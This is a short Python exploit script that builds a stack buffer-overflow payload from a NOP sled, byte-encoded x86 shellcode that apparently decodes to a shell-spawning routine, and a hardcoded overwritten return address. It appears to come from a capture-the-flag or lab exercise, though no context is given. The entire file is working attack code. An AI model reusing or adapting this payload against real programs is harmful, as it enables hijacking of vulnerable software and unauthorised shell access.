#!/usr/bin/env python

import struct

p32 = lambda x: struct.pack("<I", x)

overflow_size = 132
eip = 0xffffd5b4

shellcode =  b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
shellcode += b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
shellcode += b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
shellcode += b"\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
shellcode += b"\x71\x8a\xe2\x53\x6b\x69\x69\x30"
shellcode += b"\x63\x62\x74\x69\x30\x63\x6a\x6f"
shellcode += b"\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
shellcode += b"\x81"


bufferoverlow = b"\x90" * (132 - len(shellcode)) + shellcode + p32(eip) + (b"A" * 4)

print(bufferoverlow)
